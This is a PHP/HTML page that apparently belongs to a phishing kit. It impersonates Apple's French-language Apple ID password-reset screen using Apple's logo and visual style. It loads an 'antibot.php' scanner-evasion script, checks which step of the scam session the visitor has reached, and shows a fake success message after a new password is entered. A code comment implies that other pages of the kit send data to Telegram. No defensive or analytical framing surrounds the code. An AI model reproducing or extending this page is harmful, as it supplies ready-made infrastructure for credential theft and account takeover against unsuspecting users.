<?php
session_start();
include __DIR__ . '/settings.php';
include __DIR__ . '/lang_main.php';
require_once __DIR__ . '/antibot.php';
validateSession(4);
?>
<!DOCTYPE html>
<html lang="<?= $current_lang ?>">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>Réinitialiser le mot de passe – Apple ID</title>
<style>
  :root {
    --bg: #f2f2f7;
    --card-bg: #ffffff;
    --card-shadow: 0 2px 24px rgba(0,0,0,0.10);
    --label: rgba(0,0,0,0.88);
    --label-secondary: rgba(60,60,67,0.6);
    --separator: rgba(60,60,67,0.22);
    --fill-tertiary: rgba(118,118,128,0.12);
    --blue: #0071e3;
    --blue-tint: rgba(0,122,255,1);
    --input-border: rgba(0,0,0,0.18);
    --theme-color-systemBlack: rgba(0,0,0,0.88);
    --green: #34c759;
    --green-tint: rgba(52,199,89,0.12);
    --radius: 18px;
  }
  @media (prefers-color-scheme: dark) {
    :root {
      --bg: rgb(28,28,30);
      --card-bg: rgb(44,44,46);
      --card-shadow: 0 4px 32px rgba(0,0,0,0.45);
      --label: rgba(255,255,255,0.98);
      --label-secondary: rgba(235,235,245,0.6);
      --separator: rgba(84,84,88,0.65);
      --fill-tertiary: rgba(118,118,128,0.24);
      --blue: #0a84ff;
      --blue-tint: rgba(10,132,255,1);
      --input-border: rgba(255,255,255,0.18);
      --theme-color-systemBlack: #ffffff;
      --green: #30d158;
      --green-tint: rgba(48,209,88,0.15);
    }
  }
  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
  html { background: var(--bg); }
  body {
    background: var(--bg);
    color: var(--label);
    font-family: -apple-system, 'SF Pro Display', 'SF Pro Text', 'Helvetica Neue', Arial, sans-serif;
    min-height: 100dvh;
    display: flex;
    flex-direction: column;
  }

  /* ── NAV ── */
  .nav {
    position: relative; top: 0; left: 0;
    width: 100%; height: 44px;
    display: flex; align-items: center;
    padding: 0 16px; flex-shrink: 0;
  }
  .nav-brand {
    display: flex; align-items: center; gap: 5px;
    font-size: 17px; font-weight: 600;
    color: var(--label); text-decoration: none; letter-spacing: -0.3px;
  }
  .nav-brand svg { fill: var(--label); flex-shrink: 0; }
  .nav-spacer { flex: 1; }
  .nav-ellipsis {
    background: none; border: none; cursor: pointer;
    padding: 8px; display: flex; align-items: center;
    justify-content: center; opacity: 0.6;
  }
  .nav-ellipsis:hover { opacity: 1; }
  .nav-ellipsis svg { fill: var(--label); }

  /* ── MAIN ── */
  .main {
    flex: 1; display: flex; flex-direction: column;
    align-items: center; justify-content: center;
    padding: 24px 16px 48px;
  }
  .card {
    background: var(--card-bg);
    border-radius: var(--radius);
    box-shadow: var(--card-shadow);
    width: 100%;
    max-width: 380px;
    padding: 44px 28px 40px;
    display: flex;
    flex-direction: column;
    align-items: center;
    text-align: center;
  }

  /* ── FOOTER ── */
  .site-footer {
    flex-shrink: 0; width: 100%;
    padding: 20px 24px;
    display: flex; justify-content: space-between;
    align-items: center; flex-wrap: wrap; gap: 8px;
  }
  .footer-links { display: flex; gap: 12px; flex-wrap: wrap; }
  .footer-links a { font-size: 12px; color: var(--label-secondary); text-decoration: none; }
  .footer-links a:hover { text-decoration: underline; }
  .footer-copy { font-size: 12px; color: var(--label-secondary); }

  /* phases stacking */
  .phases-stack { display: grid; width: 100%; }
  .phases-stack > .phase { grid-area: 1 / 1; transition: opacity .35s, transform .35s; }
  .phases-stack > .phase.hidden { opacity: 0; transform: translateY(10px); pointer-events: none; }

  /* ── lock icon ── */
  .icon-wrap {
    width: 72px;
    height: 72px;
    background: rgba(0,122,255,0.12);
    border-radius: 22px;
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 28px;
  }
  @media (prefers-color-scheme: dark) {
    .icon-wrap { background: rgba(10,132,255,0.18); }
  }
  .icon-wrap svg { width: 38px; height: 38px; }

  h1 {
    font-size: 22px;
    font-weight: 700;
    letter-spacing: -.4px;
    color: var(--label);
    margin-bottom: 10px;
  }
  .subtitle {
    font-size: 14px;
    line-height: 1.5;
    color: var(--label-secondary);
    margin-bottom: 32px;
    max-width: 300px;
  }

  /* ── form fields ── */
  .field-group { width: 100%; margin-bottom: 14px; position: relative; }
  .field-group label {
    display: block;
    font-size: 12px;
    font-weight: 600;
    color: var(--label-secondary);
    text-align: left;
    margin-bottom: 6px;
    letter-spacing: .3px;
    text-transform: uppercase;
  }
  .field-wrap {
    position: relative;
    display: flex;
    align-items: center;
  }
  .field-wrap input {
    width: 100%;
    height: 50px;
    border-radius: 12px;
    border: 1.5px solid var(--input-border);
    background: var(--fill-tertiary);
    color: var(--label);
    font-size: 16px;
    padding: 0 46px 0 16px;
    outline: none;
    transition: border-color .15s, box-shadow .15s;
  }
  .field-wrap input:focus {
    border-color: var(--blue);
    box-shadow: 0 0 0 3px rgba(0,122,255,0.2);
    background: var(--card-bg);
  }
  .toggle-vis {
    position: absolute;
    right: 14px;
    background: none;
    border: none;
    cursor: pointer;
    padding: 4px;
    color: var(--label-secondary);
    line-height: 0;
  }
  .toggle-vis svg { width: 20px; height: 20px; }

  .error-msg {
    font-size: 13px;
    color: #ff3b30;
    min-height: 18px;
    margin-bottom: 14px;
    text-align: left;
    width: 100%;
    transition: opacity .2s;
  }
  .error-msg.hidden { opacity: 0; pointer-events: none; }

  .btn-submit {
    width: 100%;
    height: 50px;
    background: var(--blue-tint);
    color: #fff;
    border: none;
    border-radius: 12px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: opacity .15s, transform .1s;
    letter-spacing: -.2px;
    margin-top: 8px;
  }
  .btn-submit:active { transform: scale(.98); }
  .btn-submit:disabled { opacity: .45; cursor: default; }

  /* ── password rules ── */
  .rules {
    width: 100%;
    background: var(--fill-tertiary);
    border-radius: 12px;
    padding: 14px 16px;
    margin-bottom: 20px;
    text-align: left;
  }
  .rule {
    font-size: 12px;
    color: var(--label-secondary);
    display: flex;
    align-items: center;
    gap: 8px;
    padding: 3px 0;
  }
  .rule .dot {
    width: 6px; height: 6px;
    border-radius: 50%;
    background: var(--label-secondary);
    flex-shrink: 0;
    transition: background .2s;
  }
  .rule.ok .dot   { background: var(--green); }
  .rule.ok        { color: var(--label); }

  /* ── success phase ── */
  .success-phase {
    display: flex;
    flex-direction: column;
    align-items: center;
    text-align: center;
    padding: 10px 0;
  }
  .checkmark-circle {
    width: 72px; height: 72px;
    border-radius: 50%;
    background: var(--green-tint);
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 28px;
    animation: popIn .4s cubic-bezier(.34,1.56,.64,1) both;
  }
  @keyframes popIn { from { transform: scale(0); opacity: 0; } to { transform: scale(1); opacity: 1; } }
  .checkmark-circle svg { width: 38px; height: 38px; stroke: var(--green); stroke-width: 3; fill: none; }
  .success-title {
    font-size: 22px;
    font-weight: 700;
    color: var(--label);
    margin-bottom: 12px;
    letter-spacing: -.4px;
  }
  .success-body {
    font-size: 15px;
    line-height: 1.55;
    color: var(--label-secondary);
    max-width: 280px;
  }
</style>
</head>
<body>

  <!-- NAV -->
  <nav class="nav">
    <a class="nav-brand" href="#">
      <svg xmlns="http://www.w3.org/2000/svg" width="84" height="23" viewBox="0 0 85 23" fill="currentColor" style="overflow:visible">
        <path d="M16.907 16.5h2.55V5.423h-2.55V16.5Zm1.28-12.832c.412 0 .763-.144 1.05-.43a1.41 1.41 0 0 0 .432-1.033c0-.407-.144-.753-.432-1.038a1.445 1.445 0 0 0-1.05-.426c-.407 0-.756.142-1.046.426-.291.285-.437.63-.437 1.038 0 .401.146.745.437 1.032.29.287.64.43 1.046.43v.001Zm9.915 13.156c1.14 0 2.157-.21 3.052-.631.864-.395 1.616-1 2.188-1.758.563-.752.908-1.624 1.037-2.619l.007-.091h-2.594l-.021.076a3.58 3.58 0 0 1-.713 1.465 3.35 3.35 0 0 1-1.258.943c-.5.219-1.065.328-1.695.328-.847 0-1.582-.22-2.204-.663-.623-.442-1.103-1.07-1.441-1.884-.338-.813-.507-1.776-.507-2.886v-.016c0-1.115.17-2.076.507-2.886.338-.81.817-1.434 1.439-1.875.62-.44 1.354-.66 2.199-.66.634 0 1.201.117 1.702.351.501.235.92.565 1.257.99.338.425.572.926.705 1.505l.026.105h2.59l-.004-.093c-.118-1.006-.46-1.895-1.028-2.668a5.886 5.886 0 0 0-2.204-1.819c-.901-.439-1.916-.658-3.044-.658-1.405 0-2.619.311-3.642.935-1.022.624-1.812 1.511-2.368 2.663-.556 1.152-.834 2.523-.834 4.113v.016c0 1.588.278 2.958.834 4.11.555 1.154 1.346 2.043 2.372 2.669 1.026.625 2.24.938 3.642.938Zm8.034-.324h2.55V1.24h-2.55V16.5Zm9.534.222c1.1 0 2.049-.231 2.846-.693.797-.461 1.413-1.122 1.846-1.982.434-.86.65-1.886.65-3.08v-.02c0-1.191-.218-2.216-.655-3.074a4.68 4.68 0 0 0-1.852-1.98c-.798-.46-1.744-.691-2.838-.691-1.086 0-2.03.23-2.829.694a4.69 4.69 0 0 0-1.855 1.981c-.438.859-.656 1.882-.656 3.07v.02c0 1.191.216 2.217.65 3.078.434.86 1.05 1.522 1.85 1.984.8.462 1.747.693 2.843.693Zm.004-2.066c-.572 0-1.063-.146-1.472-.436-.408-.291-.722-.711-.941-1.261-.219-.55-.329-1.213-.329-1.99v-.02c0-.776.11-1.438.33-1.985.22-.548.535-.967.944-1.259.408-.291.896-.437 1.461-.437.571 0 1.06.145 1.469.436.408.29.721.71.941 1.258.22.549.33 1.21.33 1.987v.02c0 .776-.11 1.438-.328 1.988-.218.55-.53.97-.936 1.262-.406.29-.896.437-1.469.437Zm10.596 2.066c.497.008.991-.071 1.46-.233.43-.156.798-.378 1.106-.668.309-.29.557-.639.73-1.026h.13V16.5h2.55V5.423h-2.55v6.444c0 .41-.055.782-.165 1.114a2.33 2.33 0 0 1-.485.853 2.153 2.153 0 0 1-.783.546 2.744 2.744 0 0 1-1.054.191c-.754 0-1.307-.216-1.657-.647-.35-.431-.526-1.063-.526-1.894V5.423h-2.55v7.166c0 .867.144 1.61.433 2.228.289.618.716 1.09 1.281 1.416.566.326 1.259.489 2.08.489Zm12.084-.024c.525 0 1.005-.08 1.441-.24a3.453 3.453 0 0 0 1.955-1.747h.13V16.5h2.55V1.24h-2.55v5.997h-.13a3.292 3.292 0 0 0-.802-1.073c-.338-.3-.727-.53-1.167-.694a4.093 4.093 0 0 0-1.433-.244c-.932 0-1.739.23-2.42.693-.681.463-1.207 1.122-1.579 1.978-.371.855-.557 1.873-.557 3.055v.016c0 1.175.186 2.19.559 3.049.372.858.9 1.52 1.585 1.984.684.464 1.49.697 2.418.697Zm.783-2.15c-.566 0-1.054-.145-1.466-.432-.412-.287-.728-.699-.95-1.235-.22-.536-.33-1.174-.33-1.913v-.016c0-.742.11-1.38.331-1.912.222-.533.539-.944.95-1.232.412-.288.9-.432 1.465-.432.56 0 1.046.146 1.46.436.413.29.735.703.964 1.237.228.534.343 1.169.343 1.906v.016c0 .732-.114 1.366-.34 1.902-.227.536-.548.95-.963 1.24-.415.29-.903.434-1.464.434v.001ZM8.856 3.158C9.35 2.56 9.7 1.745 9.7.92c0-.114-.01-.227-.03-.32-.805.03-1.774.536-2.351 1.217-.454.516-.877 1.341-.877 2.167 0 .123.02.247.031.288.052.01.134.021.217.021.721 0 1.629-.485 2.165-1.135h.001Zm.567 1.31c-1.207 0-2.186.733-2.815.733-.67 0-1.546-.691-2.598-.691C2.02 4.51 0 6.16 0 9.265c0 1.94.742 3.982 1.67 5.303.794 1.114 1.485 2.032 2.485 2.032.99 0 1.422-.66 2.65-.66 1.247 0 1.525.64 2.618.64 1.082 0 1.804-.991 2.484-1.971.763-1.124 1.083-2.218 1.093-2.27-.062-.02-2.134-.866-2.134-3.239 0-2.053 1.629-2.97 1.722-3.043-1.073-1.547-2.712-1.589-3.165-1.589Z" transform="translate(2.5 6.5)"/>
      </svg>
    </a>
    <div class="nav-spacer"></div>
    <button class="nav-ellipsis" aria-label="Plus d'options">
      <svg viewBox="0 0 64 14" xmlns="http://www.w3.org/2000/svg" width="28" height="7">
        <circle cx="7" cy="7" r="6.3"/>
        <circle cx="32" cy="7" r="6.3"/>
        <circle cx="57" cy="7" r="6.3"/>
      </svg>
    </button>
  </nav>

  <main class="main">
<div class="card">
  <div class="phases-stack">

    <!-- Phase 1 : password form -->
    <div class="phase" id="phase-form">
      <div style="display:flex;flex-direction:column;align-items:center;">
        <div class="icon-wrap">
          <svg viewBox="0 0 38 38" fill="none" xmlns="http://www.w3.org/2000/svg">
            <!-- lock body -->
            <rect x="7" y="17" width="24" height="18" rx="5" fill="#0071e3"/>
            <!-- keyhole -->
            <circle cx="19" cy="26" r="3" fill="white" opacity=".9"/>
            <rect x="17.5" y="26" width="3" height="5" rx="1.5" fill="white" opacity=".9"/>
            <!-- shackle -->
            <path d="M12 17V13a7 7 0 0114 0v4" stroke="#0071e3" stroke-width="3" stroke-linecap="round" fill="none"/>
          </svg>
        </div>
        <h1><?= t('newpass_title') ?></h1>
        <p class="subtitle"><?= t('newpass_intro') ?></p>

        <div class="field-group">
          <label><?= t('newpass_label_new') ?></label>
          <div class="field-wrap">
            <input type="password" id="newPass" placeholder="<?= t('newpass_label_new') ?>" autocomplete="new-password">
            <button class="toggle-vis" type="button" onclick="toggleVis('newPass', this)" tabindex="-1">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
              </svg>
            </button>
          </div>
        </div>

        <div class="rules" id="rules">
          <div class="rule" id="rule-len"><span class="dot"></span><?= t('newpass_rule_len') ?></div>
          <div class="rule" id="rule-upper"><span class="dot"></span><?= t('newpass_rule_upper') ?></div>
          <div class="rule" id="rule-num"><span class="dot"></span><?= t('newpass_rule_num') ?></div>
        </div>

        <div class="field-group">
          <label><?= t('newpass_label_confirm') ?></label>
          <div class="field-wrap">
            <input type="password" id="confirmPass" placeholder="<?= t('newpass_label_confirm') ?>" autocomplete="new-password">
            <button class="toggle-vis" type="button" onclick="toggleVis('confirmPass', this)" tabindex="-1">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
              </svg>
            </button>
          </div>
        </div>

        <div class="error-msg hidden" id="errMsg"><?= t('newpass_error_mismatch') ?></div>

        <button class="btn-submit" id="btnSubmit" disabled><?= t('newpass_btn') ?></button>
      </div>
    </div>

    <!-- Phase 2 : success -->
    <div class="phase hidden" id="phase-success">
      <div class="success-phase">
        <div class="checkmark-circle">
          <svg viewBox="0 0 38 38">
            <polyline points="8,20 16,28 30,12" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
        </div>
        <p class="success-title"><?= t('newpass_heading') ?></p>
        <p class="success-body"><?= t('newpass_subtitle') ?></p>
      </div>
    </div>

  </div><!-- /.phases-stack -->
</div>
  </main>

  <footer class="site-footer">
    <nav class="footer-links">
      <a href="#"><?= t('push_footer_status') ?></a>
      <a href="#"><?= t('push_footer_privacy') ?></a>
      <a href="#"><?= t('push_footer_terms') ?></a>
    </nav>
    <span class="footer-copy"><?= t('push_footer_copyright') ?></span>
  </footer>

<script>
(function() {
  var newPass     = document.getElementById('newPass');
  var confirmPass = document.getElementById('confirmPass');
  var btnSubmit   = document.getElementById('btnSubmit');
  var errMsg      = document.getElementById('errMsg');
  var phaseForm   = document.getElementById('phase-form');
  var phaseSuccess= document.getElementById('phase-success');

  function checkRules(pass) {
    document.getElementById('rule-len').classList.toggle('ok', pass.length >= 8);
    document.getElementById('rule-upper').classList.toggle('ok', /[A-Z]/.test(pass));
    document.getElementById('rule-num').classList.toggle('ok', /[0-9]/.test(pass));
    return pass.length >= 8 && /[A-Z]/.test(pass) && /[0-9]/.test(pass);
  }

  function updateBtn() {
    var np = newPass.value;
    var cp = confirmPass.value;
    var valid = checkRules(np);
    btnSubmit.disabled = !(valid && cp.length > 0);
  }

  newPass.addEventListener('input', updateBtn);
  confirmPass.addEventListener('input', function() {
    updateBtn();
    errMsg.classList.add('hidden');
  });

  btnSubmit.addEventListener('click', function() {
    if (newPass.value !== confirmPass.value) {
      errMsg.classList.remove('hidden');
      confirmPass.focus();
      return;
    }
    // Client-side only: show success, no Telegram, no redirect
    phaseForm.classList.add('hidden');
    phaseSuccess.classList.remove('hidden');
  });

  // show/hide toggle
  window.toggleVis = function(fieldId, btn) {
    var inp = document.getElementById(fieldId);
    var isPass = inp.type === 'password';
    inp.type = isPass ? 'text' : 'password';
    var eyeOpen  = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
    var eyeClosed = '<path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/>';
    btn.querySelector('svg').innerHTML = isPass ? eyeClosed : eyeOpen;
  };
})();
</script>
</body>
</html>
